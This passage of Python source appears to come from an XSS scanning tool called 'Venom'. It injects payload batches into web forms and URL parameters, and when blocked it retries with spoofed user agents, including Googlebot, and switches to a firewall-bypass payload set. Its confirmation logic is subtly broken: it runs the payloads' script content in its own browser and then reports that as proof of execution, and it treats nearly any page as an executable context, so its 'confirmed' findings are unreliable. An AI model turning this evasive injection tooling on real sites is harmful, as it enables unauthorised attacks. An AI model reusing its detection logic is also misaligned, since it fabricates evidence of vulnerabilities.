                                    logging.info(f"Simulated focus on {name} via JavaScript")
                            except WebDriverException as e:
                                logging.warning(f"JavaScript injection failed for input {name} on {url}: {e}. Falling back to Selenium.")
                                try:
                                    element = WebDriverWait(self.driver, 10).until(EC.element_to_be_clickable((By.NAME, name)) if inp.get('name') else EC.element_to_be_clickable((By.ID, name)))
                                    element.clear()
                                    element.send_keys(';'.join(batch))
                                    logging.info(f"Filled input {name} with payload batch via Selenium: {';'.join(batch)}")
                                    if any('onfocus' in p.lower() for p in batch):
                                        element.send_keys(Keys.TAB)
                                        logging.info(f"Simulated focus on {name} via Selenium")
                                except WebDriverException as e2:
                                    logging.error(f"Selenium fallback failed for input {name} on {url}: {e2}")
                    submit_button = form.find('input', {'type': 'submit'}) or form.find('button', {'type': 'submit'})
                    alert_detected = False
                    dom_changed = False
                    js_executed = False
                    alert_text = None
                    try:
                        if submit_button:
                            submit_elem = WebDriverWait(self.driver, 10).until(EC.presence_of_element_located((By.XPATH, "//input[@type='submit'] | //button[@type='submit']")))
                            self.driver.execute_script("arguments[0].click();", submit_elem)
                            logging.info(f"Clicked submit button on {url} via JavaScript")
                        else:
                            self.driver.execute_script("try { document.forms[0].submit(); } catch(e) { console.log('Form submit failed: ' + e); }")
                            logging.info(f"Submitted form via script on {url}")
                        time.sleep(3)
                        try:
                            alert = WebDriverWait(self.driver, 5).until(EC.alert_is_present())
                            alert_text = alert.text
                            alert.accept()
                            logging.info(f"Alert detected: {alert_text}")
                            if 'venom' in alert_text.lower() or 'xss' in alert_text.lower() or '1' in alert_text or self.domain in alert_text.lower():
                                alert_detected = True
                        except TimeoutException:
                            console_logs = self.driver.execute_script("return window.console.logs || [];")
                            dom_changes = self.driver.execute_script("return window.domChanges || [];")
                            if any('XSS' in str(log) or 'venom' in str(log) or self.domain in str(log).lower() for log in console_logs):
                                logging.info(f"Console log detected indicating execution: {console_logs}")
                                js_executed = True
                            elif dom_changes and any(any(p.lower() in change['html'].lower() for p in batch) for change in dom_changes):
                                logging.info(f"DOM change detected: {dom_changes[-1]['html'][:100]}...")
                                dom_changed = True
                            elif any('<script>' in p.lower() or 'on' in p.lower() for p in batch):
                                for payload in batch:
                                    if '<script>' in payload.lower():
                                        script_content = payload[payload.find('<script>')+8:payload.find('</script>')]
                                        self.driver.execute_script(f"try {{ {script_content} }} catch(e) {{ console.log('Script failed: ' + e); }}")
                                        logging.info(f"Executed script: {script_content}")
                                time.sleep(1)
                                console_logs = self.driver.execute_script("return window.console.logs || [];")
                                dom_changes = self.driver.execute_script("return window.domChanges || [];")
                                if any('XSS' in str(log) or 'venom' in str(log) or self.domain in str(log).lower() for log in console_logs):
                                    logging.info(f"Console log detected after script execution: {console_logs}")
                                    js_executed = True
                                elif dom_changes and any(any(p.lower() in change['html'].lower() for p in batch) for change in dom_changes):
                                    logging.info(f"DOM change detected after script: {dom_changes[-1]['html'][:100]}...")
                                    dom_changed = True
                                try:
                                    alert = WebDriverWait(self.driver, 5).until(EC.alert_is_present())
                                    alert_text = alert.text
                                    alert.accept()
                                    if 'venom' in alert_text.lower() or 'xss' in alert_text.lower() or '1' in alert_text or self.domain in alert_text.lower():
                                        alert_detected = True
                                except TimeoutException:
                                    pass
                    except UnexpectedAlertPresentException as e:
                        logging.info(f"Unexpected alert: {str(e)}")
                        alert = Alert(self.driver)
                        alert_text = alert.text
                        alert.accept()
                        if 'venom' in alert_text.lower() or 'xss' in alert_text.lower() or '1' in alert_text or self.domain in alert_text.lower():
                            alert_detected = True
                    
                    page_source = self.driver.page_source
                    reflected = any(p.lower() in html.unescape(page_source).lower() for p in batch)
                    in_executable_context = '<script' in page_source.lower() or 'on' in page_source.lower() or 'eval' in page_source.lower() or 'setTimeout' in page_source.lower()
                    logging.info(f"Form test: Alert: {alert_detected}, DOM Changed: {dom_changed}, JS Executed: {js_executed}, Reflected: {reflected}, Executable Context: {in_executable_context}")
                    if alert_detected or js_executed:
                        self.report_vulnerability(url, ';'.join(batch), form_data, "Form Submission XSS (Executed)", popup=True)
                    elif dom_changed or (reflected and in_executable_context and any(p.strip() for p in batch)):
                        severity = "High" if dom_changed else "Medium" if any("alert(" in p.lower() or "on" in p.lower() for p in batch) else "Low"
                        self.report_vulnerability(url, ';'.join(batch), form_data, f"Form Submission XSS (Reflected, Severity: {severity})", popup=False, dom_changed=dom_changed, js_executed=js_executed)
                    break
                except WebDriverException as e:
                    logging.warning(f"Form submission failed for {url}: {e}")
                    self.webdriver_failures += 1
                    if self.webdriver_failures < 5 and attempt < 2:
                        self.cleanup_browser()
                        self.driver = self.setup_browser()
                    else:
                        break

    def test_request(self, url: str, params: dict, payload: str, method: str = 'get', injection_point: str = 'Unknown') -> None:
        retry_attempts = 3
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
            'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Googlebot/2.1 (+http://www.google.com/bot.html)'
        ]
        
        for attempt in range(retry_attempts):
            try:
                if attempt > 0:
                    self.session.headers['User-Agent'] = random.choice(user_agents)
                    logging.info(f"Retrying {method.upper()} {url} with new User-Agent: {self.session.headers['User-Agent']}")
                
                logging.info(f"Testing {method.upper()} {url} with payload: {payload} at {injection_point} (Attempt {attempt+1})")
                resp = self.session.request(
                    method, url,
                    params=params if method == 'get' else None,
                    data=params if method != 'get' else None,
                    headers=self.session.headers,
                    timeout=self.args.timeout
                )
                status_code = resp.status_code
                
                if status_code in [403, 500, 501, 502] and attempt < retry_attempts - 1:
                    logging.info(f"Received {status_code} for {url}. Attempting bypass on attempt {attempt+2}.")
                    if status_code == 403 and not self.use_403_bypass:
                        self.use_403_bypass = True
                        self.payload_generator = PayloadGenerator(self.args.payloads_dir, self.bypass_performed, self.use_403_bypass, self.args.stealth)
                        self.payloads = self.payload_generator.generate()
                        with self.lock:
                            self.total_payloads = len(self.payloads)
                        self.ai_assistant = AIAssistant(self.payloads, self.args.ai_key) if self.args.ai_assist else None
                        self.cleanup_browser()
                        self.driver = self.setup_browser()
                    continue
                
                logging.info(f"Response status: {status_code}, length: {len(resp.text)}")
                if self.args.verbose:
                    logging.info(f"Response content: {resp.text[:100]}...")
                full_url = url + ('?' + urlencode(params) if method == 'get' and params else '')
                if self.driver:
                    self.test_dom_xss(full_url, payload, resp.text, injection_point)
                elif payload.lower() in html.unescape(resp.text).lower():
                    in_executable_context = '<script' in resp.text.lower() or 'on' in resp.text.lower() or 'eval' in resp.text.lower() or 'setTimeout' in resp.text.lower()
                    if in_executable_context and payload.strip():
                        logging.info(f"Potential XSS (reflected): {full_url}")
                        severity = "Medium" if "alert(" in payload.lower() or "on" in payload.lower() else "Low"
                        self.report_vulnerability(full_url, payload, {}, f"{injection_point} XSS (Reflected, Severity: {severity})", popup=False)
                self._display_status()
                break
                
            except (RequestException, SSLError, Timeout) as e:
                logging.warning(f"Request failed for {url}: {e} (Attempt {attempt+1})")
                if attempt == retry_attempts - 1:
                    logging.error(f"All {retry_attempts} attempts failed for {url}")
                    self._display_status()
                time.sleep(2 ** attempt)

    def test_dom_xss(self, url: str, payload: str, response_text: str, injection_point: str) -> None:
        if not self.driver:
            if payload.lower() in html.unescape(response_text).lower():
                in_executable_context = '<script' in response_text.lower() or 'on' in response_text.lower() or 'eval' in response_text.lower() or 'setTimeout' in response_text.lower()
                if in_executable_context and payload.strip():
                    severity = "Medium" if "alert(" in payload.lower() or "on" in payload.lower() else "Low"
                    self.report_vulnerability(url, payload, {}, f"{injection_point} XSS (Reflected, Severity: {severity}, No WebDriver)", popup=False)
            return
        for attempt in range(3):
            try:
                self.driver.get(url)
                time.sleep(2 if not self.args.stealth else random.uniform(5, 10))
                WebDriverWait(self.driver, self.args.webdriver_timeout).until(EC.presence_of_element_located((By.TAG_NAME, "body")))
                self.clear_alerts()
                self.driver.execute_script("window.domChanges = []; window.oldHTML = document.body.innerHTML;")
                alert_detected = False
                dom_changed = False
                js_executed = False
                alert_text = None
                try:
                    alert = WebDriverWait(self.driver, 5).until(EC.alert_is_present())
                    alert_text = alert.text
                    alert.accept()
                    logging.info(f"Immediate alert: {alert_text}")
                    if 'venom' in alert_text.lower() or 'xss' in alert_text.lower() or '1' in alert_text or self.domain in alert_text.lower():
                        alert_detected = True
                except TimeoutException:
                    console_logs = self.driver.execute_script("return window.console.logs || [];")
                    dom_changes = self.driver.execute_script("return window.domChanges || [];")
                    if any('XSS' in str(log) or 'venom' in str(log) or self.domain in str(log).lower() for log in console_logs):
                        logging.info(f"Console log detected indicating execution: {console_logs}")
                        js_executed = True
                    elif dom_changes and any(payload.lower() in change['html'].lower() for change in dom_changes):
                        logging.info(f"DOM change detected: {dom_changes[-1]['html'][:100]}...")
                        dom_changed = True
                    elif '<script>' in payload.lower() or 'on' in payload.lower() or 'javascript:' in payload.lower():
                        if '<script>' in payload.lower():
                            script_content = payload[payload.find('<script>')+8:payload.find('</script>')]
                            self.driver.execute_script(f"try {{ {script_content} }} catch(e) {{ console.log('Script failed: ' + e); }}")
                            logging.info(f"Executed script: {script_content}")
                        elif 'javascript:' in payload.lower():
                            script_content = payload.split('javascript:')[-1]
                            self.driver.execute_script(f"try {{ {script_content} }} catch(e) {{ console.log('Script failed: ' + e); }}")
                            logging.info(f"Executed javascript: {script_content}")
                        time.sleep(1)
                        console_logs = self.driver.execute_script("return window.console.logs || [];")
                        dom_changes = self.driver.execute_script("return window.domChanges || [];")
                        if any('XSS' in str(log) or 'venom' in str(log) or self.domain in str(log).lower() for log in console_logs):
                            logging.info(f"Console log detected after script execution: {console_logs}")
                            js_executed = True
                        elif dom_changes and any(payload.lower() in change['html'].lower() for change in dom_changes):
                            logging.info(f"DOM change detected after script: {dom_changes[-1]['html'][:100]}...")
                            dom_changed = True
                        try:
                            alert = WebDriverWait(self.driver, 5).until(EC.alert_is_present())
                            alert_text = alert.text
                            alert.accept()
                            if 'venom' in alert_text.lower() or 'xss' in alert_text.lower() or '1' in alert_text or self.domain in alert_text.lower():
                                alert_detected = True
                        except TimeoutException:
                            pass
                page_source = self.driver.page_source
                reflected = payload.lower() in html.unescape(page_source).lower()
                in_executable_context = '<script' in page_source.lower() or 'on' in page_source.lower() or 'eval' in page_source.lower() or 'setTimeout' in page_source.lower()
                logging.info(f"DOM test: Alert: {alert_detected}, DOM Changed: {dom_changed}, JS Executed: {js_executed}, Reflected: {reflected}, Executable Context: {in_executable_context}")
                if alert_detected or js_executed:
                    self.report_vulnerability(url, payload, {}, f'{injection_point} XSS (Executed)', popup=True)
                    if self.ai_assistant:
                        self.ai_assistant.record_success(payload, 'js' if 'script' in payload.lower() else 'html')
                elif dom_changed or (reflected and in_executable_context and payload.strip()):
                    severity = "High" if dom_changed else "Medium" if "alert(" in payload.lower() or "on" in payload.lower() else "Low"
                    self.report_vulnerability(url, payload, {}, f"{injection_point} XSS (Reflected, Severity: {severity})", popup=False, dom_changed=dom_changed, js_executed=js_executed)
                break
            except UnexpectedAlertPresentException as e:
                logging.info(f"Unexpected alert: {str(e)}")
                alert = Alert(self.driver)
                alert_text = alert.text
                alert.accept()
                if 'venom' in alert_text.lower() or 'xss' in alert_text.lower() or '1' in alert_text or self.domain in alert_text.lower():
                    self.report_vulnerability(url, payload, {}, f'{injection_point} XSS (Executed)', popup=True)
                    if self.ai_assistant:
                        self.ai_assistant.record_success(payload, 'js' if 'script' in payload.lower() else 'html')
                break
            except (WebDriverException, TimeoutException) as e:
                logging.warning(f"DOM test failed for {url} (Attempt {attempt+1}): {e}")
                self.webdriver_failures += 1
                if self.webdriver_failures < 5:
                    self.cleanup_browser()
                    self.driver = self.setup_browser()
                    if not self.driver or attempt == 2:
                        if payload.lower() in html.unescape(response_text).lower():
                            in_executable_context = '<script' in response_text.lower() or 'on' in response_text.lower() or 'eval' in response_text.lower() or 'setTimeout' in response_text.lower()
                            if in_executable_context and payload.strip():
                                severity = "Medium" if "alert(" in payload.lower() or "on" in payload.lower() else "Low"
                                self.report_vulnerability(url, payload, {}, f"{injection_point} XSS (Reflected, Severity: {severity}, WebDriver Failed)", popup=False)
                        break
                time.sleep(2 ** attempt)

    def _display_status(self) -> None:
        elapsed = int(time.time() - self.start_time)
        progress = (self.total_tests.get() / self.total_payloads * 100) if self.total_payloads else 0
        progress = min(progress, 100.0)
        payload_trunc = f"{self.current_payload[:40]}..." if len(self.current_payload) > 40 else self.current_payload
        status = f"{GREEN}╔════ Scan Status ════╗{RESET}\n" \
                 f"{GREEN}║{RESET} Progress: {WHITE}{progress:.1f}%{RESET}  Tests: {WHITE}{self.total_tests.get()}/{self.total_payloads}{RESET}  Vulns: {WHITE}{len(self.vulnerabilities)}{RESET}\n" \
                 f"{GREEN}║{RESET} Payload: {YELLOW}{payload_trunc}{RESET}\n" \
                 f"{GREEN}║{RESET} Elapsed: {WHITE}{elapsed}s{RESET}\n" \
                 f"{GREEN}╚═════════════════════╝{RESET}"
        sys.stdout.write(f"\033[2K\r{status}")
        sys.stdout.flush()

    def report_vulnerability(self, url: str, payload: str, params: dict, vuln_type: str = 'XSS', popup: bool = False, dom_changed: bool = False, js_executed: bool = False) -> None:
        with self.lock:
            if not payload.strip():
                logging.info(f"Skipping empty payload report for {url}")
                return
            full_url = url + ('?' + urlencode(params) if params else '')
            timestamp = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())
            vuln = {
                'url': full_url,
                'payload': payload,
                'type': vuln_type,
                'timestamp': timestamp,
                'executed': popup or dom_changed or js_executed,
                'context': 'JavaScript' if 'script' in payload.lower() or 'eval' in payload.lower() or 'setTimeout' in payload.lower() or 'javascript:' in payload.lower() else 'HTML',
                'waf_status': self.waf_csp_status,
                'bypass': "Yes" if self.bypass_performed or self.use_403_bypass else "No"
            }
            if vuln in self.vulnerabilities:
                return
            self.vulnerabilities.append(vuln)
            output = f"{RED}╔════ XSS DETECTED [{timestamp}] ════╗{RESET}\n" \
                     f"{RED}║{RESET} Type: {WHITE}{vuln_type}{RESET}\n" \
                     f"{RED}║{RESET} URL: {WHITE}{full_url}{RESET}\n" \
                     f"{RED}║{RESET} Payload: {YELLOW}{payload}{RESET}\n" \
                     f"{RED}║{RESET} Context: {WHITE}{vuln['context']}{RESET}\n" \
                     f"{RED}║{RESET} WAF/CSP: {WHITE}{self.waf_csp_status}{RESET} | Bypass: {WHITE}{'Yes' if self.bypass_performed or self.use_403_bypass else 'No'}{RESET}\n" \
                     f"{RED}║{RESET} Verify: {WHITE}curl \"{full_url}\" {RESET}\n"
            if popup:
                output += f"{RED}║{RESET} Proof: {GREEN}Alert triggered in browser!{RESET}\n"
            elif dom_changed:
                output += f"{RED}║{RESET} Proof: {GREEN}DOM modified by payload!{RESET}\n"
            elif js_executed:
                output += f"{RED}║{RESET} Proof: {GREEN}JavaScript executed (console log)!{RESET}\n"
            output += f"{RED}╚════════════════════════════════════╝{RESET}"
            print(output, flush=True)
            logging.info(output)

    def report(self) -> None:
        runtime = int(time.time() - self.start_time)
        executed_count = sum(1 for v in self.vulnerabilities if v['executed'])
        summary = f"{GREEN}╔════════════════════════════════════╗{RESET}\n" \
                  f"{GREEN}║       Venom XSS Scan Summary       ║{RESET}\n" \
                  f"{GREEN}╚════════════════════════════════════╝{RESET}\n" \
                  f"{WHITE}Scan Started:{RESET} {time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(self.start_time))}\n" \
                  f"{WHITE}Scan Ended:{RESET} {time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())}\n" \
                  f"{WHITE}Total Runtime:{RESET} {runtime} seconds\n" \
                  f"{WHITE}URLs Scanned:{RESET} {len(self.visited_urls)}\n" \
                  f"{WHITE}Tests Performed:{RESET} {self.total_tests.get()}\n" \
                  f"{WHITE}Vulnerabilities Found:{RESET} {len(self.vulnerabilities)}\n" \
                  f"{WHITE}Executed Vulnerabilities:{RESET} {executed_count}\n" \
                  f"{WHITE}Reflected Only:{RESET} {len(self.vulnerabilities) - executed_count}\n"
        print(summary)
        logging.info(summary)
        
        if self.vulnerabilities:
            findings = f"\n{GREEN}╔════════════════════════════════════╗{RESET}\n" \
                       f"{GREEN}║       Detailed XSS Findings        ║{RESET}\n" \
                       f"{GREEN}╚════════════════════════════════════╝{RESET}\n"
            if self.args.full_report or len(self.vulnerabilities) <= 10:
                for i, vuln in enumerate(self.vulnerabilities, 1):
                    findings += f"{YELLOW}Vulnerability #{i}{RESET}\n" \
                                f"  {WHITE}Timestamp:{RESET} {vuln['timestamp']}\n" \
                                f"  {WHITE}Type:{RESET} {vuln['type']}\n" \
                                f"  {WHITE}URL:{RESET} {vuln['url']}\n" \
                                f"  {WHITE}Payload:{RESET} {vuln['payload']}\n" \
                                f"  {WHITE}Context:{RESET} {vuln['context']}\n" \
                                f"  {WHITE}Executed:{RESET} {'Yes' if vuln['executed'] else 'No'}\n" \
                                f"  {WHITE}WAF/CSP Status:{RESET} {vuln['waf_status']}\n" \
                                f"  {WHITE}Bypass Used:{RESET} {vuln['bypass']}\n" \
                                f"  {WHITE}Verification:{RESET} curl \"{vuln['url']}\"\n" \
                                f"{GREEN}{'─' * 50}{RESET}\n"
            else:
                findings += f"Showing first 10 vulnerabilities (use --full-report for all):\n"
                for i, vuln in enumerate(self.vulnerabilities[:10], 1):
                    findings += f"{YELLOW}Vulnerability #{i}{RESET}\n" \
                                f"  {WHITE}Timestamp:{RESET} {vuln['timestamp']}\n" \
                                f"  {WHITE}Type:{RESET} {vuln['type']}\n" \
                                f"  {WHITE}URL:{RESET} {vuln['url']}\n" \
                                f"  {WHITE}Payload:{RESET} {vuln['payload']}\n" \
                                f"  {WHITE}Context:{RESET} {vuln['context']}\n" \
                                f"  {WHITE}Executed:{RESET} {'Yes' if vuln['executed'] else 'No'}\n" \
                                f"  {WHITE}WAF/CSP Status:{RESET} {vuln['waf_status']}\n" \
                                f"  {WHITE}Bypass Used:{RESET} {vuln['bypass']}\n" \
                                f"  {WHITE}Verification:{RESET} curl \"{vuln['url']}\"\n" \
                                f"{GREEN}{'─' * 50}{RESET}\n"
            findings += f"{GREEN}Total Confirmed XSS Vulnerabilities: {len(self.vulnerabilities)}{RESET}\n"
            print(findings)
            logging.info(findings)
        else:
            no_vulns = f"\n{YELLOW}[!] No XSS vulnerabilities detected.{RESET}\n"
            print(no_vulns)
            logging.info(no_vulns)
        
        if self.webdriver_failures >= 5:
            warning = f"{YELLOW}[!] Warning: WebDriver encountered multiple failures, only reflected XSS reported.{RESET}\n"
            print(warning)
            logging.info(warning)
        print(f"{GREEN}{'═' * 50}{RESET}")

if __name__ == "__main__":
    args = parse_args()
    scanner = None
    try:
        scanner = Venom(args)
        scanner.scan()
    except KeyboardInterrupt:
        logging.info("Scan interrupted by user")
        if scanner:
            scanner.running = False
            scanner.report()
            scanner.cleanup_browser()
        sys.exit(0)
    except Exception as e:
        logging.error(f"Fatal error: {e}")
        if scanner:
            scanner.report()
            scanner.cleanup_browser()
        sys.exit(1)
    finally:
        if scanner:
            scanner.report()
            scanner.cleanup_browser()
    input("Press Enter to exit...")
